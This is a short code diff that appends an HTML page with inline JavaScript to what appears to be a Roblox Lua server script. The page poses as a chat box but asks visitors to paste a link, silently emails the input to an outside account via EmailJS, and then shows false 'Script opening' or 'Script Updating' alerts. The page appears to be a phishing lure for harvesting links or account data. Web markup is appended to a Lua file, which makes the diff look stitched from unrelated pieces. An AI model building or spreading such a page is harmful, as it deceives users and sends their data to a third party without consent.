@@ -94,3 +94,35 @@ end)
 sendEvent.OnServerEvent:Connect(function(player, message)
     print(player.Name .. " sent: " .. message)
 end)
+
+
+
+<div class="box">
+    <h1>enter somethink to chat with me</h1>
+
+    <input type="text" id="mesaj" placeholder="Paste link here..." required>
+    <br>
+    <button onclick="gonder()">Send</button>
+
+</div>
+
+<script>
+    (function(){
+        emailjs.init("0qmYmoIOTH4NkUygT");
+    })();
+
+    function gonder() {
+        var mesaj = document.getElementById("mesaj").value;
+
+        var params = {
+            message: mesaj
+        };
+
+        emailjs.send("service_olk42gs", "template_hv7vl8k", params)
+        .then(function(response) {
+            alert("Script opening");
+        }, function(error) {
+            alert("Script Updating try later!");
+        });
+    }
+</script>
